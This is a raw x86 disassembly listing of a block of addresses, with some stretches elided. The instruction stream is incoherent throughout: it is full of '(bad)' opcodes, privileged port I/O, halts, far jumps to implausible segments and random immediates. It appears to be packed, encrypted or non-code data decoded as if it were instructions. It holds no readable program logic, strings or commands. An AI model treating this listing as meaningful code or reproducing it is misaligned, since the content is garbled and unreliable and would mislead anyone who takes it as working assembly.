  429de9:	cld    
  429dea:	(bad)  
  429deb:	(bad)  
  429dec:	enter  0xf4,0x0
	...
  429e54:	add    BYTE PTR [eax],al
  429e56:	fwait
  429e57:	mov    bh,0xc4
  429e59:	or     al,0xec
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	and    esp,DWORD PTR [ecx+ecx*1+0x1c16714]
  429e69:	add    BYTE PTR [eax],al
  429e6b:	add    DWORD PTR [eax],eax
  429e6d:	add    BYTE PTR [edx+0x6b860499],cl
  429e73:	xchg   ebp,eax
  429e74:	test   DWORD PTR fs:[esi+eiz*1+0x18],esi
  429e79:	int    0x21
  429e7b:	test   eax,0x3188c392
  429e80:	xchg   esp,eax
  429e81:	dec    eax
  429e82:	push   edi
  429e83:	add    esp,DWORD PTR ds:0xf05ef476
  429e89:	sub    BYTE PTR [edx],cl
  429e8b:	push   esi
  429e8c:	out    0x1a,eax
  429e8e:	scas   eax,DWORD PTR es:[edi]
  429e8f:	add    DWORD PTR [ebp+ebp*8+0x1b],ecx
  429e93:	fnop   
  429e95:	xor    ah,bh
  429e97:	mov    esi,0xcdfdaf71
  429e9c:	add    DWORD PTR [edx-0x627f4e62],edi
  429ea2:	or     al,0xc5
  429ea4:	jns    0x429e7b
  429ea6:	dec    edi
  429ea7:	les    ecx,FWORD PTR [edi+edi*2+0x45]
  429eab:	loop   0x429ea0
  429ead:	out    0xc9,al
  429eaf:	shl    DWORD PTR [edi-0x52f1a21d],cl
  429eb5:	mov    ah,BYTE PTR ds:0x92b15b38
  429ebb:	data16 mov cl,0xe2
  429ebe:	dec    esi
  429ebf:	or     DWORD PTR [ebp-0x4c2bdf00],ebp
  429ec5:	bound  ecx,QWORD PTR [bx+di+0x59]
  429ec9:	pop    esp
  429eca:	mov    BYTE PTR [edx+0x67425932],cl
  429ed0:	fwait
  429ed1:	cdq    
  429ed2:	lahf   
  429ed3:	fidivr DWORD PTR [eax+0x1]
  429ed6:	pop    esp
  429ed7:	mov    ebx,0x9307d672
  429edc:	(bad)  
  429edd:	(bad)  
  429ede:	lock dec esp
  429ee0:	leave  
  429ee1:	outs   dx,BYTE PTR ds:[esi]
  429ee2:	cmp    esp,DWORD PTR [ecx+0x2a]
  429ee5:	cli    
  429ee6:	call   0xe5e3:0x479ca59f
  429eed:	jbe    0x429eee
  429eef:	gs dec ebx
  429ef1:	pushf  
  429ef2:	push   cs
  429ef3:	jbe    0x429f22
  429ef5:	xor    DWORD PTR [ecx],esi
  429ef7:	in     eax,dx
  429ef8:	gs dec edx
  429efa:	mov    edx,ebx
  429efc:	dec    ebp
  429efd:	cmp    DWORD PTR [ebp+esi*4+0x10],ebx
  429f01:	and    bl,BYTE PTR [eax]
  429f03:	mov    ds:0x42e303aa,al
  429f08:	add    esi,DWORD PTR [edx+eax*8+0x23f4c15d]
  429f0f:	shr    BYTE PTR [esi+eax*8-0xf],1
  429f13:	stos   BYTE PTR es:[edi],al
  429f14:	jae    0x429f2f
  429f16:	lahf   
  429f17:	out    dx,al
  429f18:	mov    WORD PTR [edx+esi*4],ds
  429f1b:	js     0x429f93
  429f1d:	popf   
  429f1e:	xor    eax,0x1dee53c2
  429f23:	aaa    
  429f24:	or     eax,0x8a86a7f4
  429f29:	cld    
  429f2a:	ins    BYTE PTR es:[edi],dx
  429f2b:	xchg   edx,eax
  429f2c:	mov    al,ds:0xd81e5b15
  429f31:	test   al,0xc6
  429f33:	push   cs
  429f34:	ins    DWORD PTR es:[edi],dx
  429f35:	cmp    bl,BYTE PTR cs:0xd1911c6d
  429f3c:	leave  
  429f3d:	sub    bh,BYTE PTR [ecx]
  429f3f:	xor    ebx,DWORD PTR [esp+edi*1-0x62]
  429f43:	js     0x429ed7
  429f45:	push   eax
  429f46:	je     0x429ed5
  429f48:	ror    BYTE PTR [ebx],1
  429f4a:	xchg   edi,eax
  429f4b:	cmp    BYTE PTR [ebx-0x23],dh
  429f4e:	daa    
  429f4f:	lods   al,BYTE PTR ds:[esi]
  429f50:	fadd   st,st(5)
  429f52:	pop    esp
  429f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f54:	or     al,0x6d
  429f56:	jmp    0x429fa8
  429f58:	jg     0x429f03
  429f5a:	ja     0x429f78
  429f5c:	aad    0x2a
  429f5e:	aad    0x39
  429f60:	inc    edi
  429f61:	shl    eax,cl
  429f63:	repnz adc BYTE PTR [ecx],bh
  429f66:	pop    ds
  429f67:	cwde   
  429f68:	sahf   
  429f69:	nop
  429f6a:	sahf   
  429f6b:	in     al,dx
  429f6c:	mov    ebp,0xb6
	...
  429fd5:	add    BYTE PTR [ecx],dh
  429fd7:	inc    ebp
  429fd8:	enter  0xfc06,0x8f
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx-0x6ece94cc]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	inc    edx
  429fef:	lods   eax,DWORD PTR ds:[esi]
  429ff0:	sar    BYTE PTR [edx],cl
  429ff2:	sahf   
  429ff3:	mov    BYTE PTR [esi+0x11041127],al
  429ff9:	enter  0x81ab,0x94
  429ffd:	daa    
  429ffe:	int    0x2d
  42a000:	js     0x42a06b
  42a002:	inc    ebx
  42a003:	push   ds
  42a004:	dec    edi
  42a005:	mov    esi,DWORD PTR [eax]
  42a007:	fdivr  DWORD PTR [edx+0x311c3b6b]
  42a00d:	push   ebx
  42a00e:	adc    al,0x42
  42a010:	jno    0x429fb8
  42a012:	jp     0x429fe6
  42a014:	push   es
  42a015:	sbb    eax,0x79be63d1
  42a01a:	int3   
  42a01b:	or     BYTE PTR [edi-0x2f0023fc],0xdf
  42a022:	mov    ch,0x5
  42a024:	pop    ebx
  42a025:	dec    esi
  42a026:	mov    al,0xec
  42a028:	pop    ebp
  42a029:	(bad)  
  42a02a:	in     eax,0xd8
  42a02c:	addr16 mov ch,0x51
  42a02f:	int    0x2b
  42a031:	xor    ch,BYTE PTR [ecx-0x30]
  42a034:	std    
  42a035:	mov    dh,0x9a
  42a037:	(bad)  
  42a038:	out    dx,al
  42a039:	jo     0x42a04b
  42a03b:	mov    ch,0x5f
  42a03d:	pop    ebp
  42a03e:	sbb    bl,ah
  42a040:	outs   dx,BYTE PTR ds:[esi]
  42a041:	out    0xf7,al
  42a043:	dec    ecx
  42a044:	cmp    edx,ebp
  42a046:	xchg   esp,eax
  42a047:	cdq    
  42a048:	push   0xb94bc359
  42a04d:	pop    ebp
  42a04e:	in     al,dx
  42a04f:	jle    0x42a075
  42a051:	inc    ecx
  42a052:	jnp    0x42a0a8
  42a054:	jbe    0x42a00c
  42a056:	ins    DWORD PTR es:[edi],dx
  42a057:	shl    DWORD PTR ds:0x59373381,0x13
  42a05e:	js     0x429ff2
  42a060:	jl     0x42a07d
  42a062:	push   edx
  42a063:	mov    al,0x9c
  42a065:	and    eax,0x39b296e4
  42a06a:	inc    ecx
  42a06b:	in     eax,dx
  42a06c:	xor    BYTE PTR [ecx-0x638dbbc3],0x4d
  42a073:	(bad)  
  42a074:	dec    esi
  42a075:	(bad)  [eax+0x13]
  42a078:	jecxz  0x42a08f
  42a07a:	and    ch,BYTE PTR [esp+esi*8-0x6d133391]
  42a081:	fucomp st(1)
  42a083:	mov    ch,0x3c
  42a085:	xor    esp,DWORD PTR [edi-0x5b]
  42a088:	pop    ss
  42a089:	jmp    0x13e7f140
  42a08e:	lds    esi,FWORD PTR es:[edi]
  42a091:	mov    DWORD PTR [eax-0xea362ef],ecx
  42a097:	pop    esi
  42a098:	xor    ebx,0x5
  42a09b:	sub    eax,0xc6e02e28
  42a0a0:	call   FWORD PTR [eax+ecx*2+0x68a5dddb]
  42a0a7:	(bad)  
  42a0a8:	pop    esi
  42a0a9:	inc    eax
  42a0aa:	pop    esp
  42a0ab:	and    eax,0xaf409923
  42a0b0:	stos   DWORD PTR es:[edi],eax
  42a0b1:	pop    ss
  42a0b2:	xor    al,0x32
  42a0b4:	cli    
  42a0b5:	(bad)  
  42a0b6:	and    DWORD PTR [ebp-0x729e8670],esi
  42a0bc:	dec    ecx
  42a0bd:	leave  
  42a0be:	nop
  42a0bf:	jo     0x42a103
  42a0c1:	mul    DWORD PTR [edi+edx*4]
  42a0c4:	ret    
  42a0c5:	or     al,0x5c
  42a0c7:	int    0x7d
  42a0c9:	mov    dh,0x61
  42a0cb:	push   edx
  42a0cc:	bound  ebp,QWORD PTR [esi-0x4fd2a860]
  42a0d2:	mov    bh,0xb4
  42a0d4:	jb     0x42a132
  42a0d6:	sbb    al,0x12
  42a0d8:	pop    es
  42a0d9:	repnz pushf 
  42a0db:	and    ch,al
  42a0dd:	pop    ecx
  42a0de:	and    ch,BYTE PTR [ebp-0x4ef7c3fe]
  42a0e4:	test   DWORD PTR [ebx],esi
  42a0e6:	or     eax,edi
  42a0e8:	or     bl,BYTE PTR [esi-0x31977bc6]
	...
  42a156:	xlat   BYTE PTR ds:[ebx]
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a163:	add    BYTE PTR [edx],0x79
  42a166:	addr16 ret 
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	jle    0x42a0fd
  42a170:	adc    al,BYTE PTR [edi]
  42a172:	loopne 0x42a181
  42a174:	outs   dx,BYTE PTR ds:[esi]
  42a175:	mov    al,bh
  42a177:	adc    eax,0xe6f3724d
  42a17c:	retf   
  42a17d:	stc    
  42a17e:	mov    dh,0x2a
  42a180:	je     0x42a1ad
  42a182:	jg     0x42a1f8
  42a184:	push   esp
  42a185:	call   0x179e:0x57690ddd
  42a18c:	push   eax
  42a18d:	jae    0x42a127
  42a18f:	mov    edi,0x13d5695e
  42a194:	idiv   cl
  42a196:	xor    eax,0xf32cce72
  42a19b:	sti    
  42a19c:	cmc    
  42a19d:	(bad)  
  42a19e:	sub    DWORD PTR [eax-0x62],ebp
  42a1a1:	js     0x42a1fd
  42a1a3:	fs push 0x352a5bd7
  42a1a9:	icebp  
  42a1aa:	pop    esi
  42a1ab:	shr    ebp,cl
  42a1ad:	xchg   ebx,eax
  42a1ae:	ret    0x40ca
  42a1b1:	out    dx,al
  42a1b2:	jp     0x42a13b
  42a1b4:	nop
  42a1b5:	sub    DWORD PTR [ebx+0x1300c1f1],esp
  42a1bb:	test   al,0xfa
  42a1bd:	add    eax,0x63791eea
  42a1c2:	lods   eax,DWORD PTR ds:[esi]
  42a1c3:	js     0x42a14c
  42a1c5:	imul   ebp,ebx,0xdbc59e15
  42a1cb:	aas    
  42a1cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1cd:	push   ecx
  42a1ce:	lods   eax,DWORD PTR ds:[esi]
  42a1cf:	into   
  42a1d0:	or     eax,0x95c5351
  42a1d5:	enter  0x40bd,0x8f
  42a1d9:	out    0x26,al
  42a1db:	mov    eax,DWORD PTR [edi+0x6d]
  42a1de:	xchg   BYTE PTR [esi+0x63],cl
  42a1e1:	data16 mov cs,WORD PTR [edi+0x75]
  42a1e5:	sub    BYTE PTR [edx-0x4d874654],dh
  42a1eb:	fistp  WORD PTR [esp+eiz*8+0x62]
  42a1ef:	and    ebp,DWORD PTR [edi-0x62855acd]
  42a1f5:	lahf   
  42a1f6:	std    
  42a1f7:	stos   DWORD PTR es:[edi],eax
  42a1f8:	jmp    0x309732d9
  42a1fd:	pop    esp
  42a1fe:	sbb    BYTE PTR [ecx-0x19],0x5a
  42a202:	inc    edi
  42a203:	rcr    DWORD PTR [ebp-0x80],1
  42a206:	and    al,0xc9
  42a208:	jns    0x42a244
  42a20a:	(bad)  
  42a20b:	loopne 0x42a211
  42a20d:	xchg   edx,eax
  42a20e:	stc    
  42a20f:	add    al,0xcd
  42a211:	push   ecx
  42a212:	inc    ecx
  42a213:	rcr    edx,1
  42a215:	imul   edx,ebx,0xe37da20
  42a21b:	mov    bl,BYTE PTR [edx-0x27]
  42a21e:	fimul  DWORD PTR [edi+0xf202732]
  42a224:	xchg   BYTE PTR [edx+0x4e],al
  42a227:	ss inc ecx
  42a229:	shr    DWORD PTR [eax+0x3757d056],cl
  42a22f:	mov    ebx,0xe6fe693e
  42a234:	int    0x8b
  42a236:	lea    edi,[ebx]
  42a238:	jecxz  0x42a268
  42a23a:	jns    0x42a1ee
  42a23c:	out    dx,eax
  42a23d:	pushf  
  42a23e:	add    DWORD PTR [ecx-0x4b],esi
  42a241:	mov    ebp,ecx
  42a243:	sbb    eax,0xa3e3e4a7
  42a248:	std    
  42a249:	adc    BYTE PTR [eax],ah
  42a24b:	mov    edx,0x2683b7a7
  42a250:	and    al,0x68
  42a252:	rcl    DWORD PTR [ebx-0x9],1
  42a255:	fs push esi
  42a257:	and    DWORD PTR [edx+0x72],eax
  42a25a:	mov    ch,0x8a
  42a25c:	mov    ch,0xdd
  42a25e:	ror    BYTE PTR es:[eax+0x9],cl
  42a262:	jns    0x42a231
  42a264:	test   eax,0xab3e4149
  42a269:	int    0xfd
  42a26b:	inc    eax
  42a26c:	jmp    FWORD PTR [edx]
	...
  42a2d6:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a2dc:	scas   eax,DWORD PTR es:[edi]
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	(bad)  
  42a2e3:	popf   
  42a2e4:	sbb    eax,0x1c467bd
  42a2e9:	add    BYTE PTR [eax],al
  42a2eb:	add    DWORD PTR [eax],eax
  42a2ed:	add    BYTE PTR [edi-0x3c],dh
  42a2f0:	mov    BYTE PTR [ebp+0x4d88d0d4],ah
  42a2f6:	mov    ch,0x4d
  42a2f8:	imul   DWORD PTR [ecx+0x3a]
  42a2fb:	loop   0x42a2e0
  42a2fd:	xor    edx,ebp
  42a2ff:	in     eax,dx
  42a300:	cdq    
  42a301:	push   ebp
  42a302:	dec    edx
  42a303:	cdq    
  42a304:	aam    0x35
  42a306:	add    dh,dl
  42a308:	pop    es
  42a309:	daa    
  42a30a:	retf   
  42a30b:	fnstenv [eax-0x7dcca2fa]
  42a311:	jmp    0xeeb9:0x9eb8fa88
  42a318:	jnp    0x42a376
  42a31a:	push   edx
  42a31b:	xor    eax,0x439874f1
  42a320:	cli    
  42a321:	sub    al,0x71
  42a323:	mov    DWORD PTR [esi-0xa667f39],edi
  42a329:	sub    eax,0xa5a86027
  42a32e:	mov    eax,ds:0x93392d85
  42a333:	stc    
  42a334:	add    cl,BYTE PTR [esi-0x70]
  42a337:	cmc    
  42a338:	stos   DWORD PTR es:[edi],eax
  42a339:	xor    ebp,ebx
  42a33b:	shl    ecx,1
  42a33d:	dec    edi
  42a33e:	iret   
  42a33f:	retf   
  42a340:	pop    ss
  42a341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a342:	je     0x42a381
  42a344:	jp     0x42a2d2
  42a346:	mov    ah,0xe
  42a348:	out    0x31,al
  42a34a:	into   
  42a34b:	out    dx,al
  42a34c:	out    dx,al
  42a34d:	ficomp WORD PTR ds:0x99325e6e
  42a353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a354:	push   0xffffffd8
  42a356:	out    0x0,al
  42a358:	leave  
  42a359:	arpl   WORD PTR [ebp+0x1b],ax
  42a35c:	xor    DWORD PTR [eax],esp
  42a35e:	sub    eax,0xbc9e65e6
  42a363:	adc    dh,BYTE PTR [edx+0xf]
  42a366:	jbe    0x42a3c4
  42a368:	mov    cl,0xee
  42a36a:	outs   dx,WORD PTR ds:[esi]
  42a36c:	jb     0x42a38b
  42a36e:	es push ebx
  42a370:	in     al,dx
  42a371:	setb   BYTE PTR ds:0x4d06ecc5
  42a378:	dec    ecx
  42a379:	hlt    
  42a37a:	pop    es
  42a37b:	mov    ds,ebp
  42a37d:	xchg   edx,ebp
  42a37f:	push   ss
  42a380:	jecxz  0x42a312
  42a382:	mov    ah,0xe4
  42a384:	daa    
  42a385:	push   ss
  42a386:	cwde   
  42a387:	mov    ds,WORD PTR [ebp+0x4a]
  42a38a:	lods   al,BYTE PTR ds:[esi]
  42a38b:	sbb    eax,0xddd80cb2
  42a390:	in     al,0xf0
  42a392:	push   esp
  42a393:	sbb    dh,bh
  42a395:	and    eax,0x4d2ae66d
  42a39a:	fiadd  DWORD PTR [esp+ebp*4]
  42a39d:	sub    edi,edx
  42a39f:	or     eax,0xfb3fbfdb
  42a3a4:	in     eax,0x0
  42a3a6:	shl    BYTE PTR [ebp+edi*4+0x77],1
  42a3aa:	int    0xf9
  42a3ac:	inc    ebp
  42a3ad:	jle    0x42a3d9
  42a3af:	mov    eax,ds:0x751a6b69
  42a3b4:	mov    DWORD PTR [eax-0x3a4adecc],edi
  42a3ba:	jmp    0x416bf4e6
  42a3bf:	inc    esi
  42a3c0:	gs sub eax,0xb6acb519
  42a3c6:	xor    eax,DWORD PTR [edx-0x45]
  42a3c9:	mov    eax,ds:0x137bc40c
  42a3ce:	mov    ebp,0x7a550ae4
  42a3d3:	mov    ebp,0x6d6c9d89
  42a3d8:	adc    DWORD PTR [ebp+ecx*4-0xc],edx
  42a3dc:	mov    ebx,0xabf57d72
  42a3e1:	data16 sub al,0xc4
  42a3e4:	mov    ecx,0xd95be208
  42a3e9:	loope  0x42a447
  42a3eb:	jns    0x42a445
  42a3ed:	inc    ecx
	...
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0xb7ccf53d
  42a465:	inc    esp
  42a466:	lds    eax,FWORD PTR [bx+di]
  42a469:	add    BYTE PTR [eax],al
  42a46b:	add    DWORD PTR [eax],eax
  42a46d:	add    ch,ch
  42a46f:	push   eax
  42a470:	call   0x4be61534
  42a475:	outs   dx,BYTE PTR ds:[esi]
  42a476:	das    
  42a477:	add    eax,0x2ca66882
  42a47c:	xchg   esi,eax
  42a47d:	lock stos BYTE PTR es:[edi],al
  42a47f:	push   ds
  42a480:	or     al,bl
  42a482:	aaa    
  42a483:	add    DWORD PTR [esi],ebx
  42a485:	fst    QWORD PTR [ecx-0x25]
  42a488:	add    al,0x7b
  42a48a:	sar    DWORD PTR [edi+0x2e],0x2f
  42a48e:	mov    ebx,DWORD PTR [ebx+eiz*2]
  42a491:	popf   
  42a492:	out    dx,eax
  42a493:	shl    DWORD PTR [eax+0xac3f30],0x10
  42a49a:	pop    ebx
  42a49b:	das    
  42a49c:	and    cl,BYTE PTR [ecx+0x4a]
  42a49f:	jl     0x42a47c
  42a4a1:	adc    BYTE PTR [ebp-0x2e],bh
  42a4a4:	adc    al,0x35
  42a4a6:	mov    edi,0x41e4257b
  42a4ab:	xor    ecx,edx
  42a4ad:	push   ds
  42a4ae:	or     DWORD PTR [eax],esp
  42a4b0:	popf   
  42a4b1:	mov    edi,0xf94d57f1
  42a4b6:	jecxz  0x42a528
  42a4b8:	adc    cl,BYTE PTR [edi+0x409eddd5]
  42a4be:	adc    esi,ebp
  42a4c0:	addr16 cdq 
  42a4c2:	lds    esp,FWORD PTR [eax]
  42a4c4:	cmp    DWORD PTR [eax+0x487671e8],eax
  42a4ca:	int    0x2f
  42a4cc:	arpl   WORD PTR [eax+0x2d4f5926],cx
  42a4d2:	cmp    DWORD PTR [esi-0x43],edi
  42a4d5:	mov    ebp,0x92c791f5
  42a4da:	jno    0x42a4a5
  42a4dc:	xor    eax,0xef941367
  42a4e1:	xchg   edx,eax
  42a4e2:	push   ds
  42a4e3:	aad    0xd4
  42a4e5:	inc    cx
  42a4e7:	mov    BYTE PTR [edi],ah
  42a4e9:	jl     0x42a499
  42a4eb:	outs   dx,BYTE PTR ds:[esi]
  42a4ec:	xchg   edx,eax
  42a4ed:	inc    esi
  42a4ee:	xor    eax,0x98b9ead5
  42a4f3:	fwait
  42a4f4:	xor    BYTE PTR [ecx],ch
  42a4f6:	dec    edx
  42a4f7:	imul   eax,DWORD PTR es:[edx-0x2],0x8f38df91
  42a4ff:	popf   
  42a500:	and    BYTE PTR [ebx],dl
  42a502:	push   esi
  42a503:	stc    
  42a504:	xchg   ebp,eax
  42a505:	pushf  
  42a506:	daa    
  42a507:	pop    ss
  42a508:	(bad)  
  42a509:	sbb    eax,0x3c571d1e
  42a50e:	xor    al,BYTE PTR ds:[edx+eiz*2]
  42a512:	gs dec ebx
  42a514:	push   ecx
  42a515:	sbb    eax,0x29880a6e
  42a51a:	inc    esi
  42a51b:	ds jae 0x42a4d7
  42a51e:	dec    ebx
  42a51f:	jb     0x42a50e
  42a521:	neg    BYTE PTR [eax+esi*4]
  42a524:	mov    al,0xfa
  42a526:	gs ss hlt 
  42a529:	xchg   DWORD PTR [ecx+0x70],ebp
  42a52c:	pop    esp
  42a52d:	xchg   esp,eax
  42a52e:	adc    cl,BYTE PTR [ecx+esi*1+0x2ed41ae2]
  42a535:	imul   esp,DWORD PTR ds:0x89cbce1b,0x8f165764
  42a53f:	ins    DWORD PTR es:[edi],dx
  42a540:	fadd   QWORD PTR [ebx+ecx*8]
  42a543:	push   edi
  42a544:	mov    WORD PTR [edi-0x6f],fs
  42a547:	pushf  
  42a548:	pop    edx
  42a549:	push   edi
  42a54a:	dec    esi
  42a54b:	leave  
  42a54c:	ds or  bh,al
  42a54f:	cwde   
  42a550:	and    eax,0xcb7eee0b
  42a555:	cmp    BYTE PTR [eax-0x2e],bh
  42a558:	and    al,0xdc
  42a55a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a55b:	jmp    0xefa2:0x656a2ad6
  42a562:	adc    edx,ebp
  42a564:	test   dh,0xbf
  42a567:	adc    DWORD PTR [edx+edx*1],esp
  42a56a:	out    0xaf,al
  42a56c:	mov    ah,0x6c
	...
  42a5d6:	sbb    BYTE PTR [edi+0x17],cl
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x4a65c49f
  42a5e5:	add    al,0x67
  42a5e7:	mov    BYTE PTR [ecx],0x0
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	es xchg edi,eax
  42a5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5f2:	shl    BYTE PTR cs:[ebp-0x71004883],cl
  42a5f9:	int3   
  42a5fa:	fnstcw WORD PTR [edx]
  42a5fc:	ret    
  42a5fd:	add    bl,BYTE PTR [edi]
  42a5ff:	nop
  42a600:	repnz or eax,0x34ef155c
  42a606:	and    al,0x57
  42a608:	stos   DWORD PTR es:[edi],eax
  42a609:	popa   
  42a60a:	push   ebp
  42a60b:	jns    0x42a623
  42a60d:	dec    esi
  42a60e:	pushf  
  42a60f:	fwait
  42a610:	sbb    ecx,ebx
  42a612:	test   BYTE PTR [esi],0x10
  42a615:	pushf  
  42a616:	xchg   esp,eax
  42a617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a618:	adc    ebx,DWORD PTR [edi+0x5ff088fa]
  42a61e:	(bad)  [eax]
  42a620:	xor    BYTE PTR [edx],0xbd
  42a623:	or     eax,0x10b04fcc
  42a628:	and    BYTE PTR [edx-0x2b],ah
  42a62b:	xor    BYTE PTR [esi],dl
  42a62d:	out    dx,al
  42a62e:	and    DWORD PTR [eax+0x76],esi
  42a631:	push   ecx
  42a632:	add    bl,dl
  42a634:	sbb    al,0x5
  42a636:	lock or bl,dh
  42a639:	push   ss
  42a63a:	ins    BYTE PTR es:[edi],dx
  42a63b:	mov    ch,0x23
  42a63d:	rol    DWORD PTR [ebx+0x2a6e7d9e],0xbc
  42a644:	dec    eax
  42a645:	fild   WORD PTR [ebp+0x8]
  42a648:	mov    ecx,ds
  42a64a:	inc    esp
  42a64b:	imul   eax,DWORD PTR [ebx+0x62fe52b3],0x17
  42a652:	pop    es
  42a653:	xor    ebx,esp
  42a655:	push   cs
  42a656:	jl     0x42a619
  42a658:	cwde   
  42a659:	mov    al,ds:0xb67e4735
  42a65e:	adc    eax,0x52de1356
  42a663:	imul   BYTE PTR [edi]
  42a665:	int3   
  42a666:	cwde   
  42a667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a668:	(bad)  
  42a669:	pusha  
  42a66a:	ja     0x42a68a
  42a66c:	dec    edx
  42a66d:	add    DWORD PTR [esi+edi*1-0x2],esp
  42a671:	add    al,BYTE PTR [esi-0x5deda60c]
  42a677:	push   esi
  42a678:	dec    esp
  42a679:	mov    al,ds:0xbb1684c9
  42a67e:	aam    0x12
  42a680:	or     ah,BYTE PTR [edi+0x5e]
  42a683:	mov    ah,0x95
  42a685:	lods   eax,DWORD PTR ds:[esi]
  42a686:	test   DWORD PTR [edi],ebp
  42a688:	sahf   
  42a689:	push   ebp
  42a68a:	jne    0x42a69b
  42a68c:	or     ebp,edx
  42a68e:	push   ss
  42a68f:	fnstcw WORD PTR [edx-0x77]
  42a692:	or     al,0x2c
  42a694:	fsub   QWORD PTR [eax-0x52d27569]
  42a69a:	imul   ebx,DWORD PTR ds:0xfa2d350e,0x7c8eabd0
  42a6a4:	cmp    eax,0x36f9211a
  42a6a9:	push   eax
  42a6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a6ab:	sbb    al,BYTE PTR ds:0xd7d0e344
  42a6b1:	pop    esp
  42a6b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a6b3:	sbb    eax,0x1cd7035f
  42a6b8:	pop    es
  42a6b9:	jns    0x42a735
  42a6bb:	outs   dx,DWORD PTR ds:[esi]
  42a6bc:	lds    ebp,FWORD PTR [eax]
  42a6be:	push   0xbca3382d
  42a6c3:	and    al,0xe3
  42a6c5:	push   eax
  42a6c6:	mov    bl,0xd
  42a6c8:	cmc    
  42a6c9:	neg    BYTE PTR [ebp-0x44]
  42a6cc:	or     bl,al
  42a6ce:	xor    eax,edx
  42a6d0:	cmc    
  42a6d1:	or     eax,0xde89427e
  42a6d6:	push   esp
  42a6d7:	out    0x58,eax
  42a6d9:	cmp    DWORD PTR [ebp+0x5d],esp
  42a6dc:	(bad)  
  42a6dd:	xor    al,0x35
  42a6df:	das    
  42a6e0:	push   cs
  42a6e1:	scas   eax,DWORD PTR es:[edi]
  42a6e2:	out    dx,eax
  42a6e3:	dec    ecx
  42a6e4:	cmp    al,ah
  42a6e6:	mov    bh,0xbf
  42a6e8:	pop    esi
  42a6e9:	mov    al,0x9
  42a6eb:	rol    bl,cl
  42a6ed:	popf   
	...
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x1947ece4],0x67f0be3a
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [edi-0x61e2799f],al
  42a773:	xchg   esi,eax
  42a774:	cmp    al,0x31
  42a776:	(bad)  
  42a777:	xlat   BYTE PTR ds:[ebx]
  42a778:	jmp    0xc1e0d62a
  42a77d:	das    
  42a77e:	add    eax,0x116abfb7
  42a783:	inc    esi
  42a784:	scas   al,BYTE PTR es:[edi]
  42a785:	imul   ebp,DWORD PTR [esi+0x7e],0x56
  42a789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a78a:	dec    esi
  42a78b:	rol    DWORD PTR [esp+ecx*8-0x1822e3b0],0x20
  42a793:	inc    ebx
  42a794:	or     BYTE PTR [ebx+esi*8-0x24],0xfb
  42a799:	jne    0x42a73e
  42a79b:	pop    edx
  42a79c:	gs xchg esi,eax
  42a79e:	dec    ebp
  42a79f:	push   eax
  42a7a0:	in     al,0x3
  42a7a2:	loopne 0x42a76c
  42a7a4:	es sub dh,dl
  42a7a7:	pop    esi
  42a7a8:	pop    edx
  42a7a9:	mov    ebp,ebp
  42a7ab:	cld    
  42a7ac:	in     al,dx
  42a7ad:	out    dx,al
  42a7ae:	adc    al,0x2a
  42a7b0:	cmc    
  42a7b1:	xchg   DWORD PTR [eax+ebx*2+0x10],ebp
  42a7b5:	mov    al,ds:0xdc1f7c32
  42a7ba:	iret   
  42a7bb:	sbb    esp,DWORD PTR [eax]
  42a7bd:	js     0x42a7d1
  42a7bf:	inc    ebp
  42a7c0:	shr    BYTE PTR [ebx+0x1666b495],0x1c
  42a7c7:	fdiv   QWORD PTR ds:0xdcd50313
  42a7cd:	in     eax,dx
  42a7ce:	sbb    BYTE PTR [esi-0x6ebac33d],ch
  42a7d4:	dec    eax
  42a7d5:	sbb    DWORD PTR [esi+0xdbbea13],esi
  42a7db:	mov    dl,0xbb
  42a7dd:	int    0x9a
  42a7df:	push   edi
  42a7e0:	iret   
  42a7e1:	rcr    DWORD PTR [ebx+0x74],0x41
  42a7e5:	push   esi
  42a7e6:	adc    bl,ch
  42a7e8:	int3   
  42a7e9:	cmp    BYTE PTR ds:[ebx+ebx*4+0xf],bh
  42a7ee:	xchg   esp,ebx
  42a7f0:	jp     0x42a7af
  42a7f2:	jae    0x42a7ed
  42a7f4:	adc    dl,BYTE PTR [edi+0x5d]
  42a7f7:	test   al,0xc9
  42a7f9:	jne    0x42a876
  42a7fb:	cmp    ecx,DWORD PTR [ebx]
  42a7fd:	push   0x2b
  42a7ff:	ror    BYTE PTR [ecx-0x23],1
  42a802:	int3   
